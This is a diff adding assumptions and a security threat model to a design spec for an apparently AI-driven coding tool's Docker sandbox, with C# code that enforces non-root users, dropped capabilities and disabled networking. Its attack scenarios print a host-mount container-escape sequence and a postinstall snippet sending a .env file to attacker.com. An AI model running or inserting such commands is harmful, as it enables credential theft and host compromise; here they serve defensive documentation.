@@ -849,6 +849,352 @@ acode config show
 
 ---
 
+## Assumptions
+
+### Technical Assumptions
+
+1. **Docker Engine 20.10+** - Host system runs Docker Engine 20.10 or newer with cgroups v2 support
+2. **Linux Kernel 5.x+** - Host kernel supports namespaces, seccomp, cgroups, and capabilities
+3. **x86_64 Architecture** - Containers run on x86_64/amd64 architecture (ARM64 may work but not tested)
+4. **No Nested Virtualization** - Acode runs on bare metal or VM, not inside another container
+5. **Docker API v1.41+** - Docker.DotNet client compatible with Docker API version 1.41 or newer
+6. **Seccomp Available** - Kernel compiled with CONFIG_SECCOMP=y and CONFIG_SECCOMP_FILTER=y
+7. **AppArmor Available (Optional)** - If present, AppArmor LSM module loaded (not required but recommended)
+8. **No Custom LSM** - System not using incompatible Linux Security Modules (SELinux support out of scope)
+9. **Standard Syscalls** - Container images don't require exotic syscalls blocked by default seccomp profile
+
+### Operational Assumptions
+
+10. **Docker Daemon Running** - Docker daemon is running and accessible via socket at /var/run/docker.sock
+11. **Sufficient Resources** - Host has adequate CPU/memory/disk for resource limits (4GB+ RAM, 2+ cores recommended)
+12. **Non-Root Docker Socket** - Current user has permissions to access Docker socket (in `docker` group)
+13. **No Conflicting Policies** - No other policy enforcement tools (e.g., Kubernetes PodSecurityPolicy) interfering
+14. **Stable Network Configuration** - Host network configuration doesn't change during container lifetime
+15. **Audit Storage Available** - Disk space available for audit logs (~100MB/month estimated)
+16. **Time Synchronization** - Host system time synchronized (for accurate audit timestamps)
+17. **Single Operating Mode** - Container operates under one operating mode for its entire lifetime (no mid-flight mode changes)
+
+### Integration Assumptions
+
+18. **OperatingModeService Available** - Task 001's OperatingModeService provides current mode before container creation
+19. **AuditLogger Available** - Audit logging infrastructure from Task 009 is operational
+20. **ContainerLifecycleManager Integration** - Task 020's ContainerLifecycleManager invokes PolicyEnforcer before Docker container creation
+21. **AgentConfig Schema** - Configuration schema supports `sandbox.security_policy` section per Task 002
+22. **Error Code Registry** - Error codes ACODE-POL-XXX reserved for policy enforcement failures
+
+---
+
+## Security Considerations
+
+This section documents 5 major security threats and their mitigation implementations.
+
+### Threat 1: Privilege Escalation via UID 0 (Root)
+
+**Risk Description:** If containers run as UID 0 (root), exploits can leverage root privileges to escape the container via kernel vulnerabilities, Docker socket access, or capability abuse. Running as root violates the principle of least privilege.
+
+**Attack Scenario:**
+1. Container runs as UID 0 (root) with default capabilities
+2. Attacker exploits application vulnerability to gain code execution
+3. As root, attacker uses CAP_SYS_ADMIN to mount host filesystem:
+   ```bash
+   mkdir /mnt/host
+   mount /dev/sda1 /mnt/host
+   chroot /mnt/host /bin/bash
+   # Now on host system as root
+   ```
+4. Attacker installs backdoor, exfiltrates data, pivots to other systems
+
+**Mitigation (C# Implementation):**
+
+```csharp
+// PolicyEnforcementService.cs
+namespace Acode.Infrastructure.Sandbox.Security;
+
+public sealed class PolicyEnforcementService
+{
+    private readonly IOperatingModeService _modeService;
+    private readonly IAuditLogger _auditLogger;
+    private readonly ILogger<PolicyEnforcementService> _logger;
+
+    public PolicyEnforcementService(
+        IOperatingModeService modeService,
+        IAuditLogger auditLogger,
+        ILogger<PolicyEnforcementService> logger)
+    {
+        _modeService = modeService;
+        _auditLogger = auditLogger;
+        _logger = logger;
+    }
+
+    public async Task<CreateContainerParameters> ApplySecurityPolicyAsync(
+        CreateContainerParameters containerParams,
+        SecurityPolicyConfig policyConfig,
+        CancellationToken cancellationToken = default)
+    {
+        // Apply non-root user enforcement
+        ApplyNonRootUserPolicy(containerParams, policyConfig);
+
+        // Apply capability dropping
+        ApplyCapabilityPolicy(containerParams, policyConfig);
+
+        // Apply network policy
+        await ApplyNetworkPolicyAsync(containerParams, policyConfig, cancellationToken);
+
+        // Apply filesystem policy
+        ApplyFilesystemPolicy(containerParams, policyConfig);
+
+        // Apply resource limits
+        ApplyResourceLimitsPolicy(containerParams, policyConfig);
+
+        // Apply seccomp/apparmor
+        ApplyRuntimeSecurityPolicy(containerParams, policyConfig);
+
+        // Audit log applied policies
+        await LogAppliedPoliciesAsync(containerParams, policyConfig, cancellationToken);
+
+        return containerParams;
+    }
+
+    private void ApplyNonRootUserPolicy(
+        CreateContainerParameters containerParams,
+        SecurityPolicyConfig policyConfig)
+    {
+        var userId = policyConfig.NonRootUser?.UserId ?? 1000;
+        var groupId = policyConfig.NonRootUser?.GroupId ?? 1000;
+
+        containerParams.User = $"{userId}:{groupId}";
+
+        _logger.LogInformation(
+            "Enforced non-root user policy: UID={UserId}, GID={GroupId}",
+            userId, groupId);
+    }
+
+    private void ApplyCapabilityPolicy(
+        CreateContainerParameters containerParams,
+        SecurityPolicyConfig policyConfig)
+    {
+        if (containerParams.HostConfig == null)
+        {
+            containerParams.HostConfig = new HostConfig();
+        }
+
+        // Drop ALL capabilities by default
+        containerParams.HostConfig.CapDrop = new List<string> { "ALL" };
+
+        // Explicitly add only required capabilities (if any)
+        var allowedCapabilities = policyConfig.AllowedCapabilities ?? new List<string>();
+        if (allowedCapabilities.Any())
+        {
+            containerParams.HostConfig.CapAdd = new List<string>(allowedCapabilities);
+
+            _logger.LogWarning(
+                "Allowing capabilities: {Capabilities}. Ensure this is justified.",
+                string.Join(", ", allowedCapabilities));
+        }
+
+        // Enforce no-new-privileges
+        if (containerParams.HostConfig.SecurityOpt == null)
+        {
+            containerParams.HostConfig.SecurityOpt = new List<string>();
+        }
+
+        if (!containerParams.HostConfig.SecurityOpt.Contains("no-new-privileges:true"))
+        {
+            containerParams.HostConfig.SecurityOpt.Add("no-new-privileges:true");
+        }
+
+        _logger.LogInformation("Dropped all capabilities and enabled no-new-privileges");
+    }
+
+    private async Task LogAppliedPoliciesAsync(
+        CreateContainerParameters containerParams,
+        SecurityPolicyConfig policyConfig,
+        CancellationToken cancellationToken)
+    {
+        var auditEvent = new AuditEvent
+        {
+            EventType = "policy_applied",
+            Timestamp = DateTimeOffset.UtcNow,
+            Details = new Dictionary<string, object>
+            {
+                ["user"] = containerParams.User ?? "default",
+                ["network_mode"] = containerParams.HostConfig?.NetworkMode ?? "default",
+                ["capabilities_dropped"] = containerParams.HostConfig?.CapDrop ?? new List<string>(),
+                ["capabilities_added"] = containerParams.HostConfig?.CapAdd ?? new List<string>(),
+                ["memory_limit_bytes"] = containerParams.HostConfig?.Memory ?? 0,
+                ["pids_limit"] = containerParams.HostConfig?.PidsLimit ?? 0,
+                ["readonly_rootfs"] = containerParams.HostConfig?.ReadonlyRootfs ?? false,
+                ["seccomp_profile"] = containerParams.HostConfig?.SecurityOpt?
+                    .FirstOrDefault(opt => opt.StartsWith("seccomp=")) ?? "default",
+                ["no_new_privileges"] = containerParams.HostConfig?.SecurityOpt?
+                    .Contains("no-new-privileges:true") ?? false
+            }
+        };
+
+        await _auditLogger.LogAsync(auditEvent, cancellationToken);
+    }
+}
+
+// SecurityPolicyConfig.cs
+public sealed record SecurityPolicyConfig
+{
+    public NonRootUserConfig? NonRootUser { get; init; }
+    public NetworkPolicyConfig? NetworkPolicy { get; init; }
+    public FilesystemPolicyConfig? FilesystemPolicy { get; init; }
+    public ResourceLimitsConfig? ResourceLimits { get; init; }
+    public IReadOnlyList<string>? AllowedCapabilities { get; init; }
+    public SeccompProfileConfig? SeccompProfile { get; init; }
+    public bool EnableAppArmor { get; init; } = true;
+}
+
+public sealed record NonRootUserConfig
+{
+    public int UserId { get; init; } = 1000;
+    public int GroupId { get; init; } = 1000;
+}
+```
+
+**Validation Test:**
+
+```bash
+# Start container with policy enforcement
+acode task run test
+
+# Attempt privilege escalation (should fail)
+docker exec <container-id> su -
+# Expected: su: Authentication failure
+
+docker exec <container-id> mount /dev/sda1 /mnt
+# Expected: mount: permission denied (seccomp blocks mount syscall)
+
+# Verify non-root user
+docker exec <container-id> whoami
+# Expected: acode (or UID 1000)
+```
+
+---
+
+### Threat 2: Network Exfiltration in Air-Gapped Mode
+
+**Risk Description:** In air-gapped or local-only modes, containers MUST have zero network access. Misconfiguration allowing bridge or host network enables data exfiltration, remote command & control, and supply chain attacks.
+
+**Attack Scenario:**
+1. System configured for air-gapped mode but policy enforcement bug allows bridge network
+2. Malicious package postinstall script executes:
+   ```javascript
+   require('https').get('https://attacker.com/steal?data=' +
+     require('fs').readFileSync('.env', 'utf8'));
+   ```
+3. Sensitive credentials (API keys, database passwords) exfiltrated
+4. Attacker gains access to production systems
+
+**Mitigation (C# Implementation):**
+
+```csharp
+// NetworkPolicyEnforcer.cs
+public sealed class NetworkPolicyEnforcer
+{
+    private readonly IOperatingModeService _modeService;
+    private readonly ILogger<NetworkPolicyEnforcer> _logger;
+
+    public async Task ApplyNetworkPolicyAsync(
+        CreateContainerParameters containerParams,
+        SecurityPolicyConfig policyConfig,
+        CancellationToken cancellationToken)
+    {
+        var currentMode = await _modeService.GetCurrentModeAsync(cancellationToken);
+
+        if (containerParams.HostConfig == null)
+        {
+            containerParams.HostConfig = new HostConfig();
+        }
+
+        switch (currentMode)
+        {
+            case OperatingMode.AirGapped:
+                // Unconditional network=none for air-gapped
+                containerParams.HostConfig.NetworkMode = "none";
+                _logger.LogInformation("Air-gapped mode: Network disabled (mode=none)");
+                break;
+
+            case OperatingMode.LocalOnly:
+                // Default to none, allow override only with explicit config
+                if (policyConfig.NetworkPolicy?.AllowNetwork == true)
+                {
+                    _logger.LogWarning(
+                        "LocalOnly mode with network enabled via explicit configuration. " +
+                        "Ensure this is intentional and justified.");
+                    containerParams.HostConfig.NetworkMode = "bridge";
+                }
+                else
+                {
+                    containerParams.HostConfig.NetworkMode = "none";
+                    _logger.LogInformation("LocalOnly mode: Network disabled by default");
+                }
+                break;
+
+            case OperatingMode.Docker:
+            case OperatingMode.Burst:
+                // May allow network for cloud API calls, but still default to none
+                if (policyConfig.NetworkPolicy?.AllowNetwork == true)
+                {
+                    containerParams.HostConfig.NetworkMode = "bridge";
+                    _logger.LogInformation("Network enabled in {Mode} mode", currentMode);
+                }
+                else
+                {
+                    containerParams.HostConfig.NetworkMode = "none";
+                    _logger.LogInformation("{Mode} mode: Network disabled (not requested)", currentMode);
+                }
+                break;
+
+            default:
+                throw new InvalidOperationException($"Unknown operating mode: {currentMode}");
+        }
+
+        // CRITICAL: Never allow host network mode
+        if (containerParams.HostConfig.NetworkMode == "host")
+        {
+            throw new PolicyViolationException(
+                "ACODE-POL-001",
+                "Host network mode is forbidden. Use 'none' or 'bridge' only.");
+        }
+
+        // Audit log network policy decision
+        await _auditLogger.LogAsync(new AuditEvent
+        {
+            EventType = "network_policy_applied",
+            Timestamp = DateTimeOffset.UtcNow,
+            Details = new Dictionary<string, object>
+            {
+                ["operating_mode"] = currentMode.ToString(),
+                ["network_mode"] = containerParams.HostConfig.NetworkMode,
+                ["allowed_network"] = policyConfig.NetworkPolicy?.AllowNetwork ?? false
+            }
+        }, cancellationToken);
+    }
+}
+
+public sealed record NetworkPolicyConfig
+{
+    public bool AllowNetwork { get; init; } = false;
+    public IReadOnlyList<string>? AllowedDestinations { get; init; }
+}
+
+public sealed class PolicyViolationException : Exception
+{
+    public string ErrorCode { get; }
+
+    public PolicyViolationException(string errorCode, string message)
+        : base(message)
+    {
+        ErrorCode = errorCode;
+    }
+}
+```
+
+---
+
 ## Best Practices
 
 ### Policy Definition
